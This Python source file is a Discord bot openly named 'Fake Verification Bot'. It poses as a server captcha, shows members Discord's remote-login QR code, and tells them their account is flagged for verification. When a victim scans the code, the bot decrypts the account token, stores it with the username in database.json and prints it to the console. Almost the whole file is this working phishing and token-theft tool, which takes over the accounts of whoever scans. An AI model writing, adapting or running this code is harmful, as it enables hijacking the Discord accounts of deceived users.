#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64
from nextcord import ButtonStyle
from nextcord.ext import commands
from nextcord.ui import Button, View
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from colorama import Fore, init; init(autoreset=True)
from nextcord.utils import get

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

botToken = config.get('botToken')
prefix = config.get('prefix')
command_name = config.get('command_name')
give_role = config.get('give_role')
role_name = config.get('role_name')

#Bot title
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Astraa#6100")
    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                            ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
    print(f"""{Fore.LIGHTYELLOW_EX}------------------------------------------------------------------------------------------------------------------------\n{Fore.LIGHTWHITE_EX}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{Fore.LIGHTYELLOW_EX}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))

#Bot home page
def startprint():
    if give_role:
        give_role_texte = f"{Fore.GREEN}Active"
    else:
        give_role_texte = f"{Fore.RED}Disabled"
    bot_title()
    print(f"""                                            {Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}+{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Bot Informations:\n
                                                [#] Logged in as:    {bot.user.name}
                                                [#] Bot ID:          {bot.user.id}\n\n
                                            {Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}+{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Settings View:\n
                                                [#] Bot Prefix:      {bot.command_prefix}
                                                [#] Command Name:    {command_name}\n
                                                [#] Give Role:       {give_role_texte}
                                                [#] Role Name:       {role_name if role_name!="" else "None"}\n\n""".replace('[#]', f'{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTWHITE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX}'))
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.GREEN}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Bot Online!")

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Astraa#6100", intents=intents)

#Launching the Bot
def Init():
    botToken = config.get('botToken')
    prefix = config.get('prefix')
    if botToken == "":
        bot_title()
        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Please set a token in the config.json file.")
        return
    elif prefix == "":
        bot_title()
        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Please set a prefix in the config.json file.")
        return
    try:
        bot.run(botToken)
    except:
        os.system("cls")
        bot_title()
        input(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} The token located in the config.json file is invalid")
        return

#Event initialization
@bot.event
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="Verifies New Members"))

#Bot command
@bot.command(name=command_name)
async def start(ctx):

    verification = Button(label="Verify Me", style=ButtonStyle.blurple)

    async def verification_callback(interaction):
        
        #RemoteAuthClient by RuslanUC
        class User:
            def __init__(self, _id, _username, _discriminator, _avatar):
                self.id = _id
                self.username = _username
                self.discriminator = _discriminator
                self.avatar = _avatar
        class RemoteAuthClient:
            def __init__(self):
                self.initCrypto()
                self._heartbeatTask = None
                self.on_fingerprint = self.ev
                self.on_userdata = self.ev
                self.on_token = self.ev
                self.on_cancel = self.ev
                self.on_timeout = self.ev
    
            def initCrypto(self):
                self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                self.publicKey = self.privateKey.public_key()
                self.publicKeyString = "".join(self.publicKey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("utf8").split("\n")[1:-2])
    
            def event(self, t):
                def registerhandler(handler):
                    if t == "on_fingerprint":
                        self.on_fingerprint = handler
                    elif t == "on_userdata":
                        self.on_userdata = handler
                    elif t == "on_token":
                        self.on_token = handler
                    elif t == "on_cancel":
                        self.on_cancel = handler
                    elif t == "on_timeout":
                        self.on_timeout = handler
                    return handler
                return registerhandler
    
            def ev(self, *args, **kwargs):
                pass
    
            async def run(self):
                error = False
    
                async with connect("wss://remote-auth-gateway.discord.gg/?v=1", origin=Origin("https://discord.com")) as ws:
                    while True:
                        try:
                            data = await ws.recv()
                        except ConnectionClosedOK:
                            break
                        except ConnectionClosedError as e:
                            if e.code == 4003:
                                await self.on_timeout()
                            else:
                                error = True
                            break
    
                        p = json.loads(data)
    
                        if p["op"] == "hello":
                            await self.send({"op": "init", "encoded_public_key": self.publicKeyString}, ws)
                            self._heartbeatTask = asyncio.get_event_loop().create_task(self.sendHeartbeat(p["heartbeat_interval"], ws))
                            
                        elif p["op"] == "nonce_proof":
                            nonceHash = hashlib.sha256()
                            nonceHash.update(self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_nonce"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
                            nonceHash = base64.urlsafe_b64encode(nonceHash.digest()).decode("utf8")
                            nonceHash = nonceHash.replace("/", "").replace("+", "").replace("=", "")
                            await self.send({"op": "nonce_proof", "proof": nonceHash}, ws)

                        elif p["op"] == "pending_remote_init":
                            await self.on_fingerprint(data=f"https://discordapp.com/ra/{p['fingerprint']}")

                        elif p["op"] == "pending_finish":
                            decryptedUser = self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_user_payload"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8")
                            decryptedUser = decryptedUser.split(":")
                            await self.on_userdata(user=User(decryptedUser[0], decryptedUser[3], decryptedUser[1], decryptedUser[2]))

                        elif p["op"] == "finish":
                            await self.on_token(token=self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_token"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8"))
                            break

                        elif p["op"] == "cancel":
                            await self.on_cancel()
                            break
    
                self._heartbeatTask.cancel()
    
                if error:
                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} RemoteAuthClient disconnected with error. Reconnecting...")
                    self.initCrypto()
                    await self.run()
    
            async def sendHeartbeat(self, interval, _ws):
                while True:
                    await asyncio.sleep(interval/1000)
                    await self.send({"op": "heartbeat"}, _ws)
    
            async def send(self, jsonr, _ws):
                await _ws.send(json.dumps(jsonr))
    
        c = RemoteAuthClient()
        
        #QR Creation, Informations sender
        @c.event("on_fingerprint")
        async def on_fingerprint(data):
            @c.event("on_cancel")
            async def on_cancel():
                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Auth canceled: {data}")
    
            @c.event("on_timeout")
            async def on_timeout():
                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Timeout: {data}")
    
            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
            await interaction.edit_original_message(embed=embed_qr)
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTGREEN_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} QR Code Generated: {data}")
    
            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("database.json"):
                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                database = json.load(open("database.json", encoding="utf-8"))
    
                if not user.id in database:
                    database[user.id] = {}
    
                database[user.id]["username"] = user.username
                database[user.id]["discriminator"] = user.discriminator
                database[user.id]["avatarUrl"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
    
                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} {user.username}#{user.discriminator} ({user.id})")
    
                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("database.json"):
                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                    database = json.load(open("database.json", encoding="utf-8"))
    
                    if not user.id in database:
                        database[user.id] = {}
    
                    database[user.id]["token"] = token
    
                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)

                    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTBLUE_EX}#{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Token: {token}")
                    
                    #If Enable, gives a role after verification
                    if give_role == True:
                        try:
                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTGREEN_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} Role added to {user.username}#{user.discriminator}")
                        except:
                            print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} There is a problem with your role. Check the Name and make sure it can give this role")
        
        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1️⃣ *Open the Discord Mobile application*\n2️⃣ *Go to settings*\n3️⃣ *Choose the \"Scan QR Code\" option*\n4️⃣ *Scan the QR code below*", color=5003474)
        embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
        embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
        await interaction.response.send_message(embed=embed_qr, ephemeral=True)

    verification.callback = verification_callback

    myview = View(timeout=None)
    myview.add_item(verification)
    embed = nextcord.Embed(title="**Verification required!**", description="🔔 To acces this server, you need to pass the verification first\n🧿 Press the button bellow", color=5003474)
    await ctx.send(embed=embed, view=myview)

#Start Everything
if __name__ == '__main__':
    Init()
